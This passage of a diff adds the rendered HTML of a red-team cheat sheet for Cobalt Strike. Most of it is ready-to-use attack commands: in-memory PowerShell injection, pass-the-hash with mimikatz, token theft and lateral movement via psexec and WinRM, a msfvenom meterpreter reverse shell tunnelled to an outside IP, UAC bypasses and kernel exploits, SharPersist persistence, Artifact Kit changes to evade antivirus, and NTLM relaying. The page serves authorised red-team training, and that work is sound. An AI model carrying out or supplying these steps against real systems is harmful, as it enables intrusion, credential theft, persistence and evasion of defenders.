+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Upload a file from the attacker to the current Beacon host</span>
+</span></span><span style="display:flex;"><span>beacon &gt; upload [/path/to/file]
+</span></span></code></pre></div><h2 id="powershell-and-net">
+  Powershell and .NET
+  <a class="anchor" href="#powershell-and-net">#</a>
+</h2>
+<h3 id="powershell-commands">
+  Powershell commands
+  <a class="anchor" href="#powershell-commands">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Import a Powershell .ps1 script from the control server and save it in memory in Beacon</span>
+</span></span><span style="display:flex;"><span>beacon &gt; powershell-import [/path/to/script.ps1]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.</span>
+</span></span><span style="display:flex;"><span>beacon &gt; powershell [<span style="color:#66d9ef">commandlet][arguments</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto</span>
+</span></span><span style="display:flex;"><span>beacon &gt; powerpick [<span style="color:#66d9ef">commandlet] [argument</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs</span>
+</span></span><span style="display:flex;"><span>beacon &gt; psinject [<span style="color:#66d9ef">pid][arch] [commandlet] [arguments</span>]
+</span></span></code></pre></div><h3 id="net-remote-execution">
+  .NET remote execution
+  <a class="anchor" href="#net-remote-execution">#</a>
+</h3>
+<p>Run a local .NET executable as a Beacon post-exploitation job.</p>
+<p>Require:</p>
+<ul>
+<li>Binaries compiled with the &ldquo;Any CPU&rdquo; configuration.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>beacon &gt; execute-assembly [/path/to/script.exe] [<span style="color:#66d9ef">arguments</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; execute-assembly /home/audit/Rubeus.exe
+</span></span><span style="display:flex;"><span>[*] Tasked beacon to run .NET program<span style="color:#960050;background-color:#1e0010">:</span> Rubeus.exe
+</span></span><span style="display:flex;"><span>[+] host called home, sent<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">318507</span> bytes
+</span></span><span style="display:flex;"><span>[+] received output<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ______        _                      
+</span></span><span style="display:flex;"><span>  (_____ \      | |                     
+</span></span><span style="display:flex;"><span>   _____) )_   _| |__  _____ _   _  ___ 
+</span></span><span style="display:flex;"><span>  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span><span style="display:flex;"><span>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span><span style="display:flex;"><span>  |_|   |_|____/|____/|_____)____/(___/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v1.4.2 
+</span></span></code></pre></div><h2 id="lateral-movement">
+  Lateral Movement
+  <a class="anchor" href="#lateral-movement">#</a>
+</h2>
+<p>:warning: OPSEC Advice: Use the <strong>spawnto</strong> command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe</p>
+<ul>
+<li><strong>portscan:</strong> Performs a portscan on a specific target.</li>
+<li><strong>runas:</strong> A wrapper of runas.exe, using credentials you can run a command as another user.</li>
+<li><strong>pth:</strong> By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. <br>
+:exclamation: This module needs Administrator privileges.</li>
+<li><strong>steal_token:</strong> Steal a token from a specified process.</li>
+<li><strong>make_token:</strong> By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.</li>
+<li><strong>jump:</strong> Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. <br>
+:exclamation: The <strong>jump</strong> module will use the current delegation/impersonation token to authenticate on the remote target. <br>
+:muscle: We can combine the <strong>jump</strong> module with the <strong>make_token</strong> or <strong>pth</strong> module for a quick &ldquo;jump&rdquo; to another target on the network.</li>
+<li><strong>remote-exec:</strong> Execute a command on a remote target using psexec, winrm or wmi. <br>
+:exclamation: The <strong>remote-exec</strong> module will use the current delegation/impersonation token to authenticate on the remote target.</li>
+<li><strong>ssh/ssh-key:</strong> Authenticate using ssh with password or private key. Works for both linux and windows hosts.</li>
+</ul>
+<p>:warning: All the commands launch powershell.exe</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Beacon Remote Exploits
+</span></span><span style="display:flex;"><span>======================
+</span></span><span style="display:flex;"><span>jump [<span style="color:#66d9ef">module] [target] [listener</span>] 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    psexec	x86	Use a service to run a Service EXE artifact
+</span></span><span style="display:flex;"><span>    psexec64	x64	Use a service to run a Service EXE artifact
+</span></span><span style="display:flex;"><span>    psexec_psh	x86	Use a service to run a PowerShell one-liner
+</span></span><span style="display:flex;"><span>    winrm	x86	Run a PowerShell script via WinRM
+</span></span><span style="display:flex;"><span>    winrm64	x64	Run a PowerShell script via WinRM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Beacon Remote Execute Methods
+</span></span><span style="display:flex;"><span>=============================
+</span></span><span style="display:flex;"><span>remote-exec [<span style="color:#66d9ef">module] [target] [command</span>] 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Methods                         Description
+</span></span><span style="display:flex;"><span>    -------                         -----------
+</span></span><span style="display:flex;"><span>    psexec                          Remote execute via Service Control Manager
+</span></span><span style="display:flex;"><span>    winrm                           Remote execute via WinRM (PowerShell)
+</span></span><span style="display:flex;"><span>    wmi                             Remote execute via WMI (PowerShell)
+</span></span></code></pre></div><p>Opsec safe Pass-the-Hash:</p>
+<ol>
+<li><code>mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:&quot;powershell -w hidden&quot;</code></li>
+<li><code>steal_token PID</code></li>
+</ol>
+<h3 id="assume-control-of-artifact">
+  Assume Control of Artifact
+  <a class="anchor" href="#assume-control-of-artifact">#</a>
+</h3>
+<ul>
+<li>Use <code>link</code> to connect to SMB Beacon</li>
+<li>Use <code>connect</code> to connect to TCP Beacon</li>
+</ul>
+<h2 id="vpn--pivots">
+  VPN &amp; Pivots
+  <a class="anchor" href="#vpn--pivots">#</a>
+</h2>
+<p>:warning: Covert VPN doesn&rsquo;t work with W10, and requires Administrator access to deploy.</p>
+<blockquote>
+<p>Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon&rsquo;s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.</span>
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">PORT</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">port</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">port] [socks4</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">port] [socks5</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">port] [socks5</span>] [enableNoAuth|disableNoAuth] [<span style="color:#66d9ef">user] [password</span>]
+</span></span><span style="display:flex;"><span>beacon &gt; socks [<span style="color:#66d9ef">port] [socks5</span>] [enableNoAuth|disableNoAuth] [<span style="color:#66d9ef">user] [password</span>] [enableLogging|disableLogging]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Proxy browser traffic through a specified Internet Explorer process.</span>
+</span></span><span style="display:flex;"><span>beacon &gt; browserpivot [<span style="color:#66d9ef">pid</span>] [x86|x64]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.</span>
+</span></span><span style="display:flex;"><span>beacon &gt; rportfwd [<span style="color:#66d9ef">bind port] [forward host] [forward port</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<span style="color:#ae81ff">127.0</span>.0.1 LPORT=<span style="color:#ae81ff">4444</span> <span style="color:#f92672">-f</span> raw -o /tmp/msf.bin
+</span></span><span style="display:flex;"><span>beacon&gt; spunnel x64 <span style="color:#ae81ff">184.105</span>.181.155 <span style="color:#ae81ff">4444</span> C:\Payloads\msf.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then you can handle the connect back on your MSF multi handler</span>
+</span></span><span style="display:flex;"><span>beacon&gt; spunnel_local x64 <span style="color:#ae81ff">127.0</span>.0.1 <span style="color:#ae81ff">4444</span> C:\Payloads\msf.bin
+</span></span></code></pre></div><h2 id="kits">
+  Kits
+  <a class="anchor" href="#kits">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://cobalt-strike.github.io/community_kit/">Cobalt Strike Community Kit</a> - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike</li>
+</ul>
+<h3 id="elevate-kit">
+  Elevate Kit
+  <a class="anchor" href="#elevate-kit">#</a>
+</h3>
+<p>UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>beacon&gt; runasadmin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Beacon Command Elevators
+</span></span><span style="display:flex;"><span>========================
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Exploit                         Description
+</span></span><span style="display:flex;"><span>    -------                         -----------
+</span></span><span style="display:flex;"><span>    ms14-<span style="color:#ae81ff">058</span>                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-<span style="color:#ae81ff">2014</span>-<span style="color:#ae81ff">4113</span>)
+</span></span><span style="display:flex;"><span>    ms15-<span style="color:#ae81ff">051</span>                        Windows ClientCopyImage Win32k Exploit (CVE <span style="color:#ae81ff">2015</span>-<span style="color:#ae81ff">1701</span>)
+</span></span><span style="display:flex;"><span>    ms16-<span style="color:#ae81ff">016</span>                        mrxdav.sys WebDav Local Privilege Escalation (CVE <span style="color:#ae81ff">2016</span>-<span style="color:#ae81ff">0051</span>)
+</span></span><span style="display:flex;"><span>    svc-exe                         Get SYSTEM via an executable run as a service
+</span></span><span style="display:flex;"><span>    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
+</span></span><span style="display:flex;"><span>    uac-token-duplication           Bypass UAC with Token Duplication
+</span></span></code></pre></div><h3 id="persistence-kit">
+  Persistence Kit
+  <a class="anchor" href="#persistence-kit">#</a>
+</h3>
+<ul>
+<li>
+  <a href="https://github.com/0xthirteen/MoveKit">https://github.com/0xthirteen/MoveKit</a></li>
+<li>
+  <a href="https://github.com/fireeye/SharPersist">https://github.com/fireeye/SharPersist</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># List persistences</span>
+</span></span><span style="display:flex;"><span>SharPersist -t schtaskbackdoor -m list
+</span></span><span style="display:flex;"><span>SharPersist -t startupfolder -m list
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -m list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add a persistence</span>
+</span></span><span style="display:flex;"><span>SharPersist -t schtaskbackdoor -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Something Cool&#34;</span> -m add
+</span></span><span style="display:flex;"><span>SharPersist -t schtaskbackdoor -n <span style="color:#e6db74">&#34;Something Cool&#34;</span> -m remove
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SharPersist -t service -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Service&#34;</span> -m add
+</span></span><span style="display:flex;"><span>SharPersist -t service -n <span style="color:#e6db74">&#34;Some Service&#34;</span> -m remove
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Task&#34;</span> -m add
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Task&#34;</span> -m add -o hourly
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -n <span style="color:#e6db74">&#34;Some Task&#34;</span> -m remove
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="resource-kit">
+  Resource Kit
+  <a class="anchor" href="#resource-kit">#</a>
+</h3>
+<blockquote>
+<p>The Resource Kit is Cobalt Strike&rsquo;s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows</p>
+</blockquote>
+<h3 id="artifact-kit">
+  Artifact Kit
+  <a class="anchor" href="#artifact-kit">#</a>
+</h3>
+<blockquote>
+<p>Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique&rsquo;s folder.</p>
+</blockquote>
+<p>Artifact Kit (Cobalt Strike 4.0) - 
+  <a href="https://www.youtube.com/watch?v=6mC21kviwG4">https://www.youtube.com/watch?v=6mC21kviwG4</a> :</p>
+<ul>
+<li>Download the artifact kit : <code>Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)</code></li>
+<li>Install the dependencies : <code>sudo apt-get install mingw-w64</code></li>
+<li>Edit the Artifact code
+<ul>
+<li>Change pipename strings</li>
+<li>Change <code>VirtualAlloc</code> in <code>patch.c</code>/<code>patch.exe</code>, e.g: HeapAlloc</li>
+<li>Change Import</li>
+</ul>
+</li>
+<li>Build the Artifact</li>
+<li>Cobalt Strike -&gt; Script Manager &gt; Load .cna</li>
+</ul>
+<h3 id="mimikatz-kit">
+  Mimikatz Kit
+  <a class="anchor" href="#mimikatz-kit">#</a>
+</h3>
+<ul>
+<li>Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)</li>
+<li>Load the mimikatz.cna aggressor script</li>
+<li>Use mimikatz functions as normal</li>
+</ul>
+<h3 id="sleep-mask-kit">
+  Sleep Mask Kit
+  <a class="anchor" href="#sleep-mask-kit">#</a>
+</h3>
+<blockquote>
+<p>The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.</p>
+</blockquote>
+<p>Use the included <code>build.sh</code> or <code>build.bat</code> script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.</p>
+<h3 id="thread-stack-spoofer">
+  Thread Stack Spoofer
+  <a class="anchor" href="#thread-stack-spoofer">#</a>
+</h3>
+<blockquote>
+<p>An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.</p>
+</blockquote>
+<p>Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option <code>artifactkit_stack_spoof</code> in the config file <code>arsenal_kit.config</code>.</p>
+<h2 id="beacon-object-files">
+  Beacon Object Files
+  <a class="anchor" href="#beacon-object-files">#</a>
+</h2>
+<blockquote>
+<p>A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs</p>
+</blockquote>
+<p>Example: 
+  <a href="https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h">https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h</a></p>
+<ul>
+<li>Compile
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># To compile this with Visual Studio:</span>
+</span></span><span style="display:flex;"><span>cl.exe /c /GS- hello.c /Fohello.o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To compile this with x86 MinGW:</span>
+</span></span><span style="display:flex;"><span>i686-w64-mingw32-gcc -c hello.c -o hello.o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To compile this with x64 MinGW:</span>
+</span></span><span style="display:flex;"><span>x86_64-w64-mingw32-gcc -c hello.c -o hello.o
+</span></span></code></pre></div></li>
+<li>Execute: <code>inline-execute /path/to/hello.o</code></li>
+</ul>
+<h2 id="ntlm-relaying-via-cobalt-strike">
+  NTLM Relaying via Cobalt Strike
+  <a class="anchor" href="#ntlm-relaying-via-cobalt-strike">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>beacon&gt; socks <span style="color:#ae81ff">1080</span>
+</span></span><span style="display:flex;"><span>kali&gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb<span style="color:#960050;background-color:#1e0010">:</span>//&lt;IP_TARGET&gt;
+</span></span><span style="display:flex;"><span>beacon&gt; rportfwd_local <span style="color:#ae81ff">8445</span> &lt;IP_KALI&gt; <span style="color:#ae81ff">445</span>
+</span></span><span style="display:flex;"><span>beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
+</span></span><span style="display:flex;"><span>beacon&gt; PortBender redirect <span style="color:#ae81ff">445</span> <span style="color:#ae81ff">8445</span>
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://www.youtube.com/watch?v=q7VQeK533zI">Red Team Ops with Cobalt Strike (1 of 9): Operations</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=5gwEMocFkc0">Red Team Ops with Cobalt Strike (2 of 9): Infrastructure</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=Z8n9bIPAIao">Red Team Ops with Cobalt Strike (3 of 9): C2</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=H0_CKdwbMRk">Red Team Ops with Cobalt Strike (4 of 9): Weaponization</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=bYt85zm4YT8">Red Team Ops with Cobalt Strike (5 of 9): Initial Access</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=Pb6yvcB2aYw">Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=lzwwVwmG0io">Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=QF_6zFLmLn0">Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=sP1HgUu7duU&amp;list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&amp;index=10&amp;t=0s">Red Team Ops with Cobalt Strike (9 of 9): Pivoting</a></li>
+<li>
+  <a href="https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b">A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 </a></li>
+<li>
+  <a href="https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/">Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019</a></li>
+<li>
+  <a href="https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/">TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018</a></li>
+<li>
+  <a href="https://www.cobaltstrike.com/help-dns-beacon">Cobalt Strike - DNS Beacon</a></li>
+<li>
+  <a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/">How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017</a></li>
+<li>
+  <a href="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse</a></li>
+<li>
+  <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm">Cobalt Strike - User Guide</a></li>
+<li>
+  <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf">Cobalt Strike 4.6 - User Guide PDF</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/cobalt_strike_all_you_need.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cobalt-strike">Cobalt Strike</a>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#infrastructure">Infrastructure</a>
+          <ul>
+            <li><a href="#redirectors">Redirectors</a></li>
+            <li><a href="#domain-fronting">Domain Fronting</a></li>
+          </ul>
+        </li>
+        <li><a href="#opsec">OpSec</a>
+          <ul>
+            <li><a href="#customer-id">Customer ID</a></li>
+          </ul>
+        </li>
+        <li><a href="#payloads">Payloads</a>
+          <ul>
+            <li><a href="#dns-beacon">DNS Beacon</a></li>
+            <li><a href="#smb-beacon">SMB Beacon</a></li>
+            <li><a href="#ssh-beacon">SSH Beacon</a></li>
+            <li><a href="#metasploit-compatibility">Metasploit compatibility</a></li>
+            <li><a href="#custom-payloads">Custom Payloads</a></li>
+          </ul>
+        </li>
+        <li><a href="#malleable-c2">Malleable C2</a></li>
+        <li><a href="#files">Files</a></li>
+        <li><a href="#powershell-and-net">Powershell and .NET</a>
+          <ul>
+            <li><a href="#powershell-commands">Powershell commands</a></li>
+            <li><a href="#net-remote-execution">.NET remote execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#lateral-movement">Lateral Movement</a>
+          <ul>
+            <li><a href="#assume-control-of-artifact">Assume Control of Artifact</a></li>
+          </ul>
+        </li>
+        <li><a href="#vpn--pivots">VPN &amp; Pivots</a></li>
+        <li><a href="#kits">Kits</a>
+          <ul>
+            <li><a href="#elevate-kit">Elevate Kit</a></li>
+            <li><a href="#persistence-kit">Persistence Kit</a></li>
+            <li><a href="#resource-kit">Resource Kit</a></li>
+            <li><a href="#artifact-kit">Artifact Kit</a></li>
+            <li><a href="#mimikatz-kit">Mimikatz Kit</a></li>
+            <li><a href="#sleep-mask-kit">Sleep Mask Kit</a></li>
+            <li><a href="#thread-stack-spoofer">Thread Stack Spoofer</a></li>
+          </ul>
+        </li>
+        <li><a href="#beacon-object-files">Beacon Object Files</a></li>
+        <li><a href="#ntlm-relaying-via-cobalt-strike">NTLM Relaying via Cobalt Strike</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
